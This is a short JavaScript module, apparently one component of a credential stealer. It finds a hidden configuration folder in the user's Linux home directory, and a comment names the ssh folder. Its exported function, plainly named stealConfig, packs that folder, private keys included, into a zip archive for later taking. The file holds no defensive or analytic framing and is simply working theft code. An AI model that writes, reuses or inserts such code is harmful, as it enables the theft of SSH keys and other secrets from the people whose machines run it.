import fs from 'fs';
import AdmZip from 'adm-zip';

// Find the path of the ssh folder for linux
function FindConfigFolder(folder) {
    let configFolder = '';
    if (process.platform == 'linux') {
        const home = process.env.HOME || process.env.HOMEPATH || process.env.USERPROFILE;
        const config = home + `/.${folder}`;
        if (fs.existsSync(config)) {
            configFolder = config;
        }
    }
    return configFolder;
}

// Read the files of config folder on linux
// function ReadConfigFolder(folder) {
//     let configFolder = FindConfigFolder(folder);
//     let files = [];
//     if (configFolder != '') {
//         files = fs.readdirSync(configFolder);
//     }
//     return files;
// }

function stealConfig(folder, outputFile)
{
    let configFolder = FindConfigFolder(folder);
    let files = [];
    
    if (configFolder != '') {
        files = fs.readdirSync(configFolder);
    }

    let zip = new AdmZip();

    zip.addLocalFolder(configFolder);
    zip.writeZip(outputFile);
}

export { stealConfig };